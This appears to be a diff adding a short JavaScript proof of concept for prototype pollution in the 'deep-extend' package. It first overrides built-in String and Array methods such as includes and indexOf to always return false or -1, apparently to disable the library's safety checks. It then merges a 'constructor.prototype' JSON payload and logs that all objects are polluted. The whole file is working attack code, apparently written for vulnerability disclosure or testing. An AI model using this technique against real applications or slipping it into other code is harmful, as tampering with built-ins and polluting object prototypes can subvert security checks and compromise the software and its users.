@@ -1,0 +1,16 @@
+String.prototype.includes = () => false;
+String.prototype.startsWith = () => false;
+String.prototype.endsWith = () => false;
+String.prototype.indexOf = () => -1;
+String.prototype.lastIndexOf = () => false;
+String.prototype.match = () => false;
+String.prototype.search = () => false;
+String.prototype.matchAll = () => false;
+Array.prototype.includes = () => false;
+Array.prototype.indexOf = () => -1;
+const merge = require('deep-extend');
+const malicious_payload = '{"constructor": {"prototype": {"polluted":"yes"}}}';
+obj = {};
+console.log({}.polluted);
+merge({}, JSON.parse(malicious_payload));
+console.log({}.polluted);
